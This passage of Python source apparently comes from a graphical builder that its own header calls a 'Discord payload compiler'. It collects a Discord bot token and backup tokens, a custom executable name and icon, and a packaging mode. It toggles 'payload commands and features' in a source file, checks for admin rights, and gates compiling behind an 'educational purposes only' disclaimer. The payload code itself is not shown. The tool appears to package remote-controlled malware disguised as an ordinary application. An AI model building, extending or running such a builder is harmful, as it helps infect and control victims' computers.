                           text_color=TEXT if enabled else DIM)
        lbl.grid(row=0, column=0, padx=(10, 6), pady=6, sticky="w")
        if subtitle:
            ctk.CTkLabel(box, text=subtitle, anchor="w",
                         font=ctk.CTkFont(family="Poppins", size=9),
                         text_color=DIM).grid(row=1, column=0, padx=(10, 6), pady=(0, 6), sticky="w")

        sw = ctk.CTkSwitch(box, text="", width=40, progress_color=self.app.accent,
                           button_color="#e6e6f0", fg_color="#232330")
        if enabled:
            sw.select()
        sw.grid(row=0, column=1, rowspan=2, padx=(0, 10))
        sw.configure(command=lambda: callback(sw, box, lbl))

        box.bind("<Enter>", lambda e: box.configure(border_color="#2a2a3a"))
        box.bind("<Leave>", lambda e: box.configure(border_color=BORDER))
        self._grid_row += 1
        self._count += 1
        self._rows.append(box)

    def _row_command(self, cmd):
        label = "." + (cmd["aliases"][0] if cmd["aliases"] else cmd["name"])
        extra = "def " + cmd["name"]
        if len(cmd["aliases"]) > 1:
            extra += "  ·  " + ", ".join("." + a for a in cmd["aliases"][1:])
        enabled = cmd["name"] not in self.filt["disabled_commands"]
        self._row(label, extra, enabled,
                  lambda sw, box, lbl, n=cmd["name"]: self._toggle(sw, box, lbl, "cmd", n))

    def _row_feature(self, feat):
        enabled = feat["id"] not in self.filt["disabled_features"]
        self._row(feat["label"], feat["desc"], enabled,
                  lambda sw, box, lbl, fid=feat["id"]: self._toggle(sw, box, lbl, "feat", fid))

    def _toggle(self, sw, box, lbl, kind, key):
        state = bool(sw.get())
        target = self.filt["disabled_commands"] if kind == "cmd" else self.filt["disabled_features"]
        if state:
            target.discard(key)
            self._on += 1
        else:
            target.add(key)
            self._on -= 1
        lbl.configure(text_color=TEXT if state else DIM)
        self._update_count()
        box.configure(border_color=self.app.accent)
        self.after(140, lambda: box.winfo_exists() and box.configure(border_color=BORDER))

    def _bulk(self, enable):
        query = self.search.get().strip().lower()
        if self.tab == "commands":
            for c in self.cmds:
                if query and query not in (" ".join([c["name"]] + c["aliases"]).lower()):
                    continue
                if enable:
                    self.filt["disabled_commands"].discard(c["name"])
                else:
                    self.filt["disabled_commands"].add(c["name"])
        else:
            for f in FEATURES:
                if query and query not in (f["label"] + f["desc"] + f["id"]).lower():
                    continue
                if enable:
                    self.filt["disabled_features"].discard(f["id"])
                else:
                    self.filt["disabled_features"].add(f["id"])
        self._rebuild()

    def _switch_tab(self, value):
        self.tab = "features" if value.lower().startswith("f") else "commands"
        self._rebuild()

    def apply(self):
        if not self.lines:
            self.app.log("filter: {} not found".format(SOURCE_FILE), "err")
            self.close()
            return
        try:
            out = apply_filters(self.lines, self.filt["disabled_features"],
                                self.filt["disabled_commands"])
            with open(self.path, "w", encoding="utf-8") as f:
                f.writelines(out)
            save_filter_state(self.filt)
            self.app.log("filter: {} commands and {} features disabled".format(
                len(self.filt["disabled_commands"]), len(self.filt["disabled_features"])), "ok")
            self.app.toast("Filter applied")
        except Exception as exc:
            self.app.log("filter: {}".format(exc), "err")
            self.app.toast("Filter failed", "err")
        self.close()

    def close(self):
        if self._dead:
            return
        self._dead = True
        self._animate_out()

    def _animate_scan(self):
        if self._dead:
            return
        try:
            width = self.scanbar.winfo_width()
            if width > 200:
                self._sx += 7
                if self._sx > width - 140:
                    self._sx = 0
                self.scan.place(x=self._sx, y=0)
        except Exception:
            pass
        self.after(26, self._animate_scan)

    def _animate_rows(self):
        for i, box in enumerate(self._rows[:8]):
            self.after(i * 18, lambda b=box: self._pulse(b))

    def _pulse(self, box):
        try:
            if not box.winfo_exists():
                return
            box.configure(border_color="#33334a")
            self.after(170, lambda: box.winfo_exists() and box.configure(border_color=BORDER))
        except Exception:
            pass

    def _animate_in(self, step=0):
        if self._dead:
            return
        t = step / 10.0
        try:
            self.attributes("-alpha", min(1.0, 0.45 + t * 0.55))
        except Exception:
            pass
        if step < 10:
            self.after(16, lambda: self._animate_in(step + 1))

    def _animate_out(self, step=0):
        t = step / 8.0
        try:
            self.attributes("-alpha", max(0.0, 1.0 - t))
        except Exception:
            pass
        if step < 8:
            self.after(14, lambda: self._animate_out(step + 1))
        else:
            self.app.filter_open = False
            try:
                self.grab_release()
            except Exception:
                pass
            self.destroy()

def _synth_clicks(count=3):
    paths = []
    rate = 44100
    try:
        os.makedirs(SFX_DIR, exist_ok=True)
    except Exception:
        return paths
    for i in range(count):
        path = os.path.join(SFX_DIR, "synth{}.wav".format(i))
        try:
            n = int(rate * 0.05)
            frames = bytearray()
            for k in range(n):
                t = k / float(rate)
                env = math.exp(-t * 95.0)
                v = (random.uniform(-1, 1) * 0.55 +
                     math.sin(2 * math.pi * random.uniform(1900, 3800) * t) * 0.45) * env
                frames += struct.pack("<h", int(max(-1.0, min(1.0, v)) * 19000))
            with wave.open(path, "wb") as w:
                w.setnchannels(1)
                w.setsampwidth(2)
                w.setframerate(rate)
                w.writeframes(bytes(frames))
            paths.append(path)
        except Exception:
            pass
    return paths


BANNER = r"""
 _                    __  __ _
| |    ___  ___ _____ |  \/  (_)
| |   / _ \/ __/ __|  | |\/| | |
| |__|  __/\__ \__ \  | |  | | |
|_____\___||___/___/  |_|  |_|_|
"""


class ModernBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("{}  ·  {}".format(APP_NAME, VERSION))
        self.geometry("1140x820")
        self.minsize(960, 720)
        self.resizable(True, True)
        self.configure(fg_color=BG)
        self.attributes("-alpha", 0.0)

        self.accent = "#f67474"
        self.pulse_val = 0.35
        self.pulse_dir = 1
        self.sound_buffers = []
        self.last_sound_index = -1
        self._sfx_queue = queue.Queue(maxsize=6)
        self._anim_tokens = {}
        self.busy = False
        self.cancelled = False
        self.build_ok = False
        self.proc = None
        self.inputs = {}
        self.log_file = None
        self.filter_open = False
        self.logo_path = resolve_logo()
        self.config_data = {"token_1": "", "exe_name": "application.exe", "icon_path": ""}

        self._apply_window_icon()
        self.init_key_sounds()
        self.create_widgets()
        self.animate_pulse()
        self.fade_in()
        self.refresh_admin_badge()

        self.bind("<Control-Return>", lambda e: self.start_compile_thread())
        self.bind("<Escape>", lambda e: self.cancel_build())
        self.bind("<Control-f>", lambda e: self.open_filter())

        self.log(BANNER.strip("\n"), "accent")
        self.log("{} {} ready".format(APP_NAME, VERSION), "ok")
        self.log("python {} · {} · {}".format(platform.python_version(), platform.system(), platform.machine()), "dim")
        self.log("cwd: {}".format(os.getcwd()), "dim")
        self.log("logo: {}".format(self.logo_path or "monogram fallback"), "dim")
        self.log("audio backend: {}".format(AUDIO_BACKEND or "none"), "dim")

    def _anim(self, widget, attr, start, end, steps=8, delay=13):
        key = str(widget)
        self._anim_tokens[key] = self._anim_tokens.get(key, 0) + 1
        token = self._anim_tokens[key]

        def step(i):
            if self._anim_tokens.get(key) != token:
                return
            try:
                if not widget.winfo_exists():
                    return
                widget.configure(**{attr: _mix(start, end, i / float(steps))})
            except Exception:
                return
            if i < steps:
                self.after(delay, lambda: step(i + 1))

        step(0)

    def bind_hover(self, widget, normal, hover, text_normal=None, text_hover=None, guard=None):
        def read(attr, fallback):
            try:
                value = widget.cget(attr)
            except Exception:
                return fallback
            return value if isinstance(value, str) and value.startswith("#") else fallback

        def enter(_=None):
            if guard and not guard():
                return
            self._anim(widget, "fg_color", read("fg_color", normal), hover, 7, 11)
            if text_normal and text_hover:
                self._anim(widget, "text_color", read("text_color", text_normal), text_hover, 7, 11)

        def leave(_=None):
            if guard and not guard():
                return
            self._anim(widget, "fg_color", read("fg_color", hover), normal, 10, 15)
            if text_normal and text_hover:
                self._anim(widget, "text_color", read("text_color", text_hover), text_normal, 10, 15)

        widget.bind("<Enter>", enter, add="+")
        widget.bind("<Leave>", leave, add="+")

    def _bars(self):
        items = [(self.accent_row, "fg_color", self.accent, SUCCESS),
                 (self.progress, "progress_color", self.accent, SUCCESS)]
        for bar, factor in zip(self.grad, (1.0, 0.45, 0.18)):
            items.append((bar, "fg_color", _tint(self.accent, factor), _tint(SUCCESS, factor)))
        return items

    def paint_bars(self, success, steps=12, delay=16):
        for widget, attr, normal, good in self._bars():
            try:
                current = widget.cget(attr)
            except Exception:
                current = normal
            if not isinstance(current, str) or not current.startswith("#"):
                current = normal
            self._anim(widget, attr, current, good if success else normal, steps, delay)

    def _apply_window_icon(self):
        if not self.logo_path:
            return
        ico = ensure_ico(self.logo_path)
        if ico:
            try:
                self.iconbitmap(ico)
            except Exception:
                pass
        photo = _load_icon_photo(self.logo_path, 256)
        if photo:
            self._win_icon = photo
            try:
                self.iconphoto(True, photo)
            except Exception:
                pass

    def init_key_sounds(self):
        if not AUDIO_BACKEND:
            self.log("no audio backend, keystroke sfx disabled", "warn")
            return
        if AUDIO_BACKEND == "winsound":
            threading.Thread(target=self._sfx_worker, daemon=True).start()
        threading.Thread(target=self._load_sounds, daemon=True).start()

    def _mp3_to_wav(self, src, dst):
        try:
            import imageio_ffmpeg
            exe = imageio_ffmpeg.get_ffmpeg_exe()
            subprocess.run([exe, "-y", "-loglevel", "error", "-i", src, dst],
                           capture_output=True, creationflags=0x08000000, timeout=30)
            return os.path.exists(dst) and os.path.getsize(dst) > 1024
        except Exception:
            return False

    def _register_sound(self, src, index):
        try:
            if AUDIO_BACKEND == "pygame":
                sound = pygame.mixer.Sound(src)
                sound.set_volume(0.25)
                self.sound_buffers.append(sound)
                return
            if src.lower().endswith(".mp3"):
                wav = os.path.join(SFX_DIR, "key{}.wav".format(index))
                if not os.path.exists(wav) and not self._mp3_to_wav(src, wav):
                    return
                src = wav
            self.sound_buffers.append(src)
        except Exception:
            pass

    def _load_sounds(self):
        try:
            os.makedirs(SFX_DIR, exist_ok=True)
        except Exception:
            return

        for i, url in enumerate(SOUND_URLS):
            mp3 = os.path.join(SFX_DIR, "key{}.mp3".format(i))
            try:
                if not os.path.exists(mp3) or os.path.getsize(mp3) < 4096:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=15) as resp:
                        data = resp.read()
                    if len(data) < 4096:
                        continue
                    if not (data[:3] == b"ID3" or data[:2] == b"\xff\xfb" or data[:4] == b"OggS"):
                        continue
                    with open(mp3, "wb") as f:
                        f.write(data)
                self._register_sound(mp3, i)
            except Exception as exc:
                self.log("sfx {} failed: {}".format(i, exc), "dim")

        if not self.sound_buffers:
            self.log("network sfx unavailable, synthesizing clicks", "warn")
            for i, wav in enumerate(_synth_clicks()):
                self._register_sound(wav, i)

        if self.sound_buffers:
            self.log("keystroke sfx loaded: {} sample(s) via {}".format(
                len(self.sound_buffers), AUDIO_BACKEND), "ok")
        else:
            self.log("keystroke sfx unavailable", "warn")

    def _sfx_worker(self):
        while True:
            path = self._sfx_queue.get()
            try:
                winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_NODEFAULT)
            except Exception:
                pass

    def play_key_sound(self, event=None):
        if not AUDIO_BACKEND or not self.sound_buffers:
            return
        if event and not (len(event.char) == 1 or event.keysym in ("BackSpace", "Return", "space")):
            return
        if len(self.sound_buffers) > 1:
            idx = self.last_sound_index
            while idx == self.last_sound_index:
                idx = random.randint(0, len(self.sound_buffers) - 1)
        else:
            idx = 0
        self.last_sound_index = idx

        if AUDIO_BACKEND == "pygame":
            try:
                channel = pygame.mixer.find_channel(False)
                if channel is None:
                    channel = pygame.mixer.find_channel(True)
                if channel:
                    channel.set_volume(0.22 + random.uniform(0.0, 0.12))
                    channel.play(self.sound_buffers[idx])
            except Exception:
                pass
        else:
            try:
                self._sfx_queue.put_nowait(self.sound_buffers[idx])
            except Exception:
                pass

    def fade_in(self, a=0.0):
        a += 0.07
        if a >= 1.0:
            self.attributes("-alpha", 1.0)
            return
        self.attributes("-alpha", a)
        self.after(15, lambda: self.fade_in(a))

    def animate_pulse(self):
        self.pulse_val += 0.05 * self.pulse_dir
        if self.pulse_val >= 1.0:
            self.pulse_val, self.pulse_dir = 1.0, -1
        elif self.pulse_val <= 0.3:
            self.pulse_val, self.pulse_dir = 0.3, 1
        if not self.busy:
            g = int(110 + 145 * self.pulse_val)
            try:
                self.dot.configure(text_color="#{:02x}{:02x}{:02x}".format(g, g, g))
            except Exception:
                pass
        self.after(50, self.animate_pulse)

    def create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(2, weight=1)

        header = ctk.CTkFrame(self, height=46, corner_radius=13, fg_color=PANEL,
                              border_width=1, border_color=BORDER)
        header.grid(row=0, column=0, padx=18, pady=(14, 2), sticky="ew")
        header.grid_propagate(False)

        self.edge = ctk.CTkFrame(header, width=3, corner_radius=2, fg_color=self.accent)
        self.edge.pack(side="left", fill="y")

        logo_box = ctk.CTkFrame(header, width=24, height=24, corner_radius=8, fg_color="#15151d",
                                border_width=1, border_color="#262632")
        logo_box.pack(side="left", padx=(10, 8))
        logo_box.pack_propagate(False)

        self.logo_image = _load_photo(self.logo_path, 18) if self.logo_path else None
        if self.logo_image:
            self.lbl_logo = ctk.CTkLabel(logo_box, text="", image=self.logo_image)
            self.lbl_logo.pack(expand=True)
        else:
            self.canvas_logo = tkinter.Canvas(logo_box, width=24, height=24, bg="#15151d",
                                              highlightthickness=0)
            self.canvas_logo.place(x=0, y=0)
            self.ring = self.canvas_logo.create_oval(3, 3, 21, 21, outline=_tint(self.accent, 0.35), width=1)
            self.orbit = self.canvas_logo.create_arc(1, 5, 23, 19, start=200, extent=140,
                                                     style="arc", outline=self.accent, width=2)
            self.lbl_logo = ctk.CTkLabel(logo_box, text="LM",
                                         font=ctk.CTkFont(family="Poppins", size=8, weight="bold"),
                                         text_color=TEXT)
            self.lbl_logo.pack(expand=True)

        self.lbl_title = ctk.CTkLabel(header, text=APP_NAME,
                                      font=ctk.CTkFont(family="Poppins", size=14, weight="bold"),
                                      text_color=TEXT)
        self.lbl_title.pack(side="left")
        ctk.CTkLabel(header, text="·  Discord payload compiler", text_color=DIM,
                     font=ctk.CTkFont(family="Poppins", size=8)).pack(side="left", padx=(7, 0))

        right = ctk.CTkFrame(header, fg_color="transparent")
        right.pack(side="right", padx=10)

        self.badge_admin = ctk.CTkLabel(right, text="no admin",
                                        font=ctk.CTkFont(family="Poppins", size=8, weight="bold"),
                                        text_color="#ffb9a8", fg_color="#1a1113", corner_radius=999,
                                        padx=7, pady=1)
        self.badge_admin.pack(side="right", padx=(5, 0))
        ctk.CTkLabel(right, text=VERSION, font=ctk.CTkFont(family="Poppins", size=8, weight="bold"),
                     text_color=MUTED, fg_color="#15151d", corner_radius=999,
                     padx=7, pady=1).pack(side="right")

        self.btn_filter = ctk.CTkButton(right, text="FILTER", command=self.open_filter,
                                        width=62, height=22, corner_radius=999,
                                        font=ctk.CTkFont(family="Poppins", size=8, weight="bold"),
                                        fg_color="#191922", hover_color=self.accent,
                                        border_width=1, border_color=BORDER, text_color=TEXT)
        self.btn_filter.pack(side="right", padx=(0, 5))
        self.bind_hover(self.btn_filter, "#191922", self.accent, TEXT, "#0b0b10")

        self.accent_row = ctk.CTkFrame(self, height=2, width=84, fg_color=self.accent, corner_radius=1)
        self.accent_row.grid(row=1, column=0, padx=18, pady=(0, 8), sticky="w")
        self.accent_row.grid_propagate(False)

        body = ctk.CTkFrame(self, fg_color="transparent")
        body.grid(row=2, column=0, padx=18, pady=4, sticky="nsew")
        body.grid_columnconfigure(0, weight=3)
        body.grid_columnconfigure(1, weight=2)
        body.grid_rowconfigure(0, weight=1)

        form = ctk.CTkScrollableFrame(body, fg_color="transparent", corner_radius=0,
                                      scrollbar_button_color="#22222c", scrollbar_button_hover_color="#33333f")
        form.grid(row=0, column=0, padx=(0, 14), sticky="nsew")
        self.apply_smooth_scroll(form)

        card = self.section(form, "CONNECTION")
        self.field(card, 0, "Bot token", "token_1", "", secret=True)
        row_bk = ctk.CTkFrame(card, fg_color="transparent")
        row_bk.grid(row=1, column=0, padx=14, pady=(0, 14), sticky="ew")
        row_bk.grid_columnconfigure((0, 1), weight=1)
        for i, key in enumerate(("token_2", "token_3")):
            sub = ctk.CTkFrame(row_bk, fg_color="transparent")
            sub.grid(row=0, column=i, padx=(0, 6) if i == 0 else (6, 0), sticky="ew")
            sub.grid_columnconfigure(0, weight=1)
            self.field(sub, 0, "Backup token {}".format(i + 1), key, "", secret=True, pad=False)

        card = self.section(form, "OUTPUT")
        self.field(card, 0, "Executable name", "exe_name", "application.exe")
        ctk.CTkLabel(card, text="Packaging mode", font=ctk.CTkFont(family="Poppins", size=10),
                     text_color=MUTED).grid(row=1, column=0, padx=14, pady=(4, 4), sticky="w")
        self.mode_var = ctk.StringVar(value="Single EXE")
        self.mode_seg = ctk.CTkSegmentedButton(
            card, values=["Single EXE", "Folder"], variable=self.mode_var, height=34,
            font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
            corner_radius=9, fg_color=PANEL_2,
            unselected_color=PANEL_2, unselected_hover_color="#191922",
            selected_color="#2a2a3a", selected_hover_color="#33334a", text_color=TEXT)
        self.mode_seg.grid(row=2, column=0, padx=14, pady=(0, 14), sticky="ew")

        card = self.section(form, "SOURCE")
        row_sf = ctk.CTkFrame(card, fg_color="transparent")
        row_sf.grid(row=0, column=0, padx=14, pady=14, sticky="ew")
        row_sf.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(row_sf, text="Payload commands and features",
                     font=ctk.CTkFont(family="Poppins", size=11),
                     text_color=MUTED, anchor="w").grid(row=0, column=0, sticky="w")
        btn_src = ctk.CTkButton(row_sf, text="Filter", command=self.open_filter, width=110, height=32,
                                corner_radius=9, fg_color="#191922", hover_color="#242432",
                                border_width=1, border_color=BORDER, text_color=TEXT,
                                font=ctk.CTkFont(family="Poppins", size=11, weight="bold"))
        btn_src.grid(row=0, column=1, sticky="e")
        self.bind_hover(btn_src, "#191922", "#242432", TEXT, self.accent)

        card = self.section(form, "ICON")
        row_ic = ctk.CTkFrame(card, fg_color="transparent")
        row_ic.grid(row=0, column=0, padx=14, pady=14, sticky="ew")
        row_ic.grid_columnconfigure(0, weight=1)
        self.lbl_icon = ctk.CTkLabel(row_ic, text="No custom icon",
                                     font=ctk.CTkFont(family="Poppins", size=11),
                                     text_color=MUTED, anchor="w")
        self.lbl_icon.grid(row=0, column=0, sticky="w")
        self.btn_icon = ctk.CTkButton(row_ic, text="Pick .ico", command=self.select_icon, width=110, height=32,
                                      corner_radius=9, fg_color="#191922", hover_color="#242432",
                                      border_width=1, border_color=BORDER, text_color=TEXT,
                                      font=ctk.CTkFont(family="Poppins", size=11, weight="bold"))
        self.btn_icon.grid(row=0, column=1, sticky="e")
        self.bind_hover(self.btn_icon, "#191922", "#242432", TEXT, self.accent)

        card = self.section(form, "TERMS")
        self.chk_terms = ctk.CTkCheckBox(
            card,
            text="I understand this was made for educational purposes and the creator is not\n"
                 "responsible for misuse or any direct/indirect damage. Everything is at my\n"
                 "own risk.",
            command=self.toggle_build_button, font=ctk.CTkFont(family="Poppins", size=10),
            text_color=MUTED, border_width=1, corner_radius=4,
            checkmark_color="#0b0b10", fg_color=self.accent, hover_color=self.accent)
        self.chk_terms.grid(row=0, column=0, padx=14, pady=14, sticky="w")

        panel = ctk.CTkFrame(body, corner_radius=18, fg_color=PANEL, border_width=1, border_color=BORDER)
        panel.grid(row=0, column=1, sticky="nsew")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        head = ctk.CTkFrame(panel, fg_color="transparent", height=36)
        head.grid(row=0, column=0, padx=16, pady=(14, 2), sticky="ew")
        head.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(head, text="BUILD LOG", font=ctk.CTkFont(family="Poppins", size=10, weight="bold"),
                     text_color=MUTED).grid(row=0, column=0, sticky="w")
        btn_clear = ctk.CTkButton(head, text="clear", command=self.clear_log, width=54, height=24, corner_radius=7,
                                  fg_color="transparent", hover_color="#191922", border_width=1, border_color=BORDER,
                                  text_color=MUTED, font=ctk.CTkFont(family="Poppins", size=10))
        btn_clear.grid(row=0, column=1, padx=(0, 4))
        self.bind_hover(btn_clear, "#0e0e13", "#191922", MUTED, TEXT)
        btn_open = ctk.CTkButton(head, text="open", command=self.open_log, width=54, height=24, corner_radius=7,
                                 fg_color="transparent", hover_color="#191922", border_width=1, border_color=BORDER,
                                 text_color=MUTED, font=ctk.CTkFont(family="Poppins", size=10))
        btn_open.grid(row=0, column=2)
        self.bind_hover(btn_open, "#0e0e13", "#191922", MUTED, TEXT)

        self.console = ctk.CTkTextbox(panel, fg_color="#08080c", text_color="#cfd3e0", corner_radius=12,
                                      border_width=1, border_color="#15151d",
                                      font=ctk.CTkFont(family="Consolas", size=11), wrap="word")
        self.console.grid(row=1, column=0, padx=12, pady=(0, 12), sticky="nsew")
        self.console.configure(state="disabled")
        tb = self.console._textbox
        tb.tag_config("info", foreground="#cfd3e0")
        tb.tag_config("ok", foreground="#7ef0b0")
        tb.tag_config("warn", foreground="#ffd98a")
        tb.tag_config("err", foreground="#ff8f8f")
        tb.tag_config("dim", foreground=DIM)
        tb.tag_config("accent", foreground=self.accent)

        footer = ctk.CTkFrame(self, corner_radius=18, fg_color=PANEL, border_width=1, border_color=BORDER)
        footer.grid(row=3, column=0, padx=18, pady=(12, 18), sticky="ew")

        self.grad = []
        for i, f in enumerate((1.0, 0.45, 0.18)):
            bar = ctk.CTkFrame(footer, height=2, corner_radius=1, fg_color=_tint(self.accent, f))
            bar.pack(fill="x", padx=18, pady=(8 if i == 0 else 1, 0))
            self.grad.append(bar)

        inner = ctk.CTkFrame(footer, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=20, pady=(6, 14))

        status = ctk.CTkFrame(inner, fg_color="transparent")
        status.pack(side="left", fill="both", expand=True)

        row = ctk.CTkFrame(status, fg_color="transparent")
        row.pack(fill="x")
        self.dot = ctk.CTkLabel(row, text="●", font=ctk.CTkFont(size=13), text_color="#8c8c8c", width=14)
        self.dot.pack(side="left", padx=(0, 6))
        self.lbl_status = ctk.CTkLabel(row, text="Ready to compile",
                                       font=ctk.CTkFont(family="Poppins", size=12),
                                       text_color=MUTED, anchor="w")
        self.lbl_status.pack(side="left", fill="x")

        self.progress = ctk.CTkProgressBar(status, height=5, corner_radius=3, fg_color="#12121a",
                                           progress_color=self.accent)
        self.progress.set(0)
        self.progress.pack(fill="x", pady=(9, 0))

        self.lbl_pct = ctk.CTkLabel(status, text="0 %", font=ctk.CTkFont(family="Poppins", size=10),
                                    text_color=DIM)
        self.lbl_pct.pack(anchor="e")

        actions = ctk.CTkFrame(inner, fg_color="transparent")
        actions.pack(side="right", padx=(16, 0))

        self.btn_cancel = ctk.CTkButton(actions, text="CANCEL", command=self.cancel_build,
                                        height=46, width=104, corner_radius=999,
                                        font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                                        fg_color="transparent", hover_color="#241a1a",
                                        border_width=1, border_color="#33262a", text_color="#ffb9a8",
                                        state="disabled")
        self.btn_cancel.pack(side="left", padx=(0, 10))
        self.bind_hover(self.btn_cancel, "#0e0e13", "#241a1a", "#ffb9a8", "#ffd9cf",
                        guard=lambda: self.btn_cancel.cget("state") == "normal")

        self.btn_compile = ctk.CTkButton(actions, text="COMPILE", command=self.start_compile_thread,
                                         height=46, width=220, corner_radius=999,
                                         font=ctk.CTkFont(family="Poppins", size=13, weight="bold"),
                                         state="disabled", fg_color="#232330", hover_color=self.accent,
                                         text_color="#8a8a9c")
        self.btn_compile.pack(side="left")
        self.bind_hover(self.btn_compile, "#232330", self.accent, TEXT, "#0b0b10",
                        guard=lambda: self.btn_compile.cget("state") == "normal")

        ctk.CTkLabel(actions, text="Ctrl + Enter  ·  Esc  ·  Ctrl + F", font=ctk.CTkFont(family="Poppins", size=9),
                     text_color=DIM).pack(side="bottom", pady=(5, 0))

    def section(self, parent, title):
        head = ctk.CTkFrame(parent, fg_color="transparent")
        head.pack(anchor="w", padx=6, pady=(12, 6))
        glyph = ctk.CTkFrame(head, width=6, height=6, corner_radius=1, fg_color=self.accent)
        glyph.pack(side="left", padx=(0, 6))
        ctk.CTkLabel(head, text=title, font=ctk.CTkFont(family="Poppins", size=10, weight="bold"),
                     text_color=DIM).pack(side="left")
        card = ctk.CTkFrame(parent, fg_color=PANEL, corner_radius=14, border_width=1, border_color=BORDER)
        card.pack(fill="x", padx=2, pady=(0, 2))
        card.grid_columnconfigure(0, weight=1)
        card.bind("<Enter>", lambda e: card.configure(border_color="#2a2a3a"))
        card.bind("<Leave>", lambda e: card.configure(border_color=BORDER))
        return card

    def field(self, parent, row, label, key, default, secret=False, pad=True):
        holder = ctk.CTkFrame(parent, fg_color="transparent")
        holder.grid(row=row, column=0, padx=14 if pad else 0, pady=(12, 0), sticky="ew")
        holder.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(holder, text=label, font=ctk.CTkFont(family="Poppins", size=10),
                     text_color=MUTED).grid(row=0, column=0, sticky="w")
        entry = ctk.CTkEntry(holder, show="*" if secret else "", height=36, corner_radius=9,
                             border_width=1, fg_color="#0a0a0f", border_color=BORDER, text_color=TEXT,
                             font=ctk.CTkFont(family="Poppins", size=12))
        entry.insert(0, default)
        entry.grid(row=1, column=0, pady=(3, 0), sticky="ew")
        try:
            entry._entry.bind("<KeyPress>", self.play_key_sound, add="+")
        except Exception:
            entry.bind("<KeyPress>", self.play_key_sound, add="+")
        self.config_data[key] = default
        if secret:
            btn = ctk.CTkButton(holder, text="show", width=48, height=36, corner_radius=9,
                                fg_color="transparent", hover_color="#191922", border_width=1,
                                border_color=BORDER, text_color=MUTED,
                                font=ctk.CTkFont(family="Poppins", size=10))
            btn.grid(row=1, column=1, padx=(6, 0), pady=(3, 0))
            btn.configure(command=lambda e=entry, b=btn: self.toggle_secret(e, b))
            self.bind_hover(btn, "#0e0e13", "#191922", MUTED, TEXT)
        self.inputs[key] = entry
        return entry

    def toggle_secret(self, entry, btn):
        if entry.cget("show") == "*":
            entry.configure(show="")
            btn.configure(text="hide")
        else:
            entry.configure(show="*")
            btn.configure(text="show")

    def apply_smooth_scroll(self, frame):
        canvas = frame._parent_canvas
        canvas._target = 0.0
        canvas._job = None

        def step():
            if not canvas.winfo_exists():
                return
            cur = canvas.yview()[0]
            diff = canvas._target - cur
            if abs(diff) > 0.0015:
                canvas.yview_moveto(cur + diff * 0.22)
                canvas._job = self.after(12, step)
            else:
                canvas.yview_moveto(canvas._target)
                canvas._job = None

        def on_wheel(event):
            base = canvas._target if canvas._job else canvas.yview()[0]
            canvas._target = max(0.0, min(1.0, base - (event.delta / 120) * 0.09))
            if not canvas._job:
                step()
            return "break"

        canvas.bind("<Enter>", lambda e: canvas.bind_all("<MouseWheel>", on_wheel))
        canvas.bind("<Leave>", lambda e: canvas.unbind_all("<MouseWheel>"))

    def refresh_admin_badge(self):
        if is_admin():
            self.badge_admin.configure(text="admin", text_color="#a8ffd8", fg_color="#0f1a16")
        else:
            self.badge_admin.configure(text="no admin", text_color="#ffb9a8", fg_color="#1a1113")

    def toggle_build_button(self):
        if self.busy:
            return
        ready = self.chk_terms.get() == 1
        self.btn_compile.configure(state="normal" if ready else "disabled")
        self.btn_compile.configure(fg_color="#232330", text_color=TEXT if ready else "#8a8a9c")
        self.log("terms {}".format("accepted" if ready else "revoked"), "dim")

    def select_icon(self):
        path = tkinter.filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if path:
            self.config_data["icon_path"] = path
            self.lbl_icon.configure(text=os.path.basename(path), text_color=TEXT)
            self.btn_icon.configure(text="Change")
            self.log("icon: {} ({})".format(path, human_size(os.path.getsize(path))), "dim")

    def open_filter(self):
        if self.filter_open:
            return
        if not os.path.exists(SOURCE_FILE):
            self.log("filter: {} not found".format(SOURCE_FILE), "err")
            self.toast("Source file missing", "err")
            return
        self.filter_open = True
        try:
            FilterPopup(self)
        except Exception as exc:
            self.filter_open = False
            self.log("filter popup failed: {}".format(exc), "err")
            self.toast("Filter failed", "err")

    def log(self, msg, level="info"):
        self.after(0, lambda: self._append_log(msg, level))

    def _append_log(self, msg, level):
        ts = time.strftime("%H:%M:%S")
        line = "[{}] {}\n".format(ts, msg)
        self.console.configure(state="normal")
        self.console.insert("end", line, level)
        self.console.see("end")
        self.console.configure(state="disabled")
        try:
            if self.log_file is None:
                os.makedirs(APPDATA_DIR, exist_ok=True)
                self.log_file = os.path.join(
                    APPDATA_DIR, "build-{}.log".format(time.strftime("%Y%m%d-%H%M%S")))
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass

    def clear_log(self):
        self.console.configure(state="normal")
        self.console.delete("1.0", "end")
        self.console.configure(state="disabled")

    def open_log(self):
        if self.log_file and os.path.exists(self.log_file):
            os.startfile(self.log_file)
        else:
            os.startfile(APPDATA_DIR)

    def update_status(self, msg, progress_val=None, level="info"):
        self.after(0, lambda: self._apply_status(msg, progress_val, level))

    def _apply_status(self, msg, progress_val, level):
        colors = {"info": MUTED, "ok": SUCCESS, "warn": "#ffd98a", "err": "#ff8f8f"}
        self.lbl_status.configure(text=msg, text_color=colors.get(level, MUTED))
        self.dot.configure(text_color=colors.get(level, MUTED))
        self.log(msg, level)
        if progress_val is not None:
            self.progress.set(progress_val)
            self.lbl_pct.configure(text="{} %".format(int(progress_val * 100)))

    def bump(self, value):
        self.after(0, lambda: (self.progress.set(value),
                               self.lbl_pct.configure(text="{} %".format(int(value * 100)))))

    def reset_ui_state(self):
        self.busy = False
        self.cancelled = False
        self.proc = None
        self.chk_terms.configure(state="normal")
        self.mode_seg.configure(state="normal")
        self.btn_cancel.configure(state="disabled", fg_color="transparent")
        self.btn_compile.configure(state="normal" if self.chk_terms.get() == 1 else "disabled",
                                   fg_color="#232330", text_color=TEXT)
        if not self.build_ok:
            self.paint_bars(False, 10, 14)
        self.refresh_admin_badge()

    def toast(self, text, level="ok"):
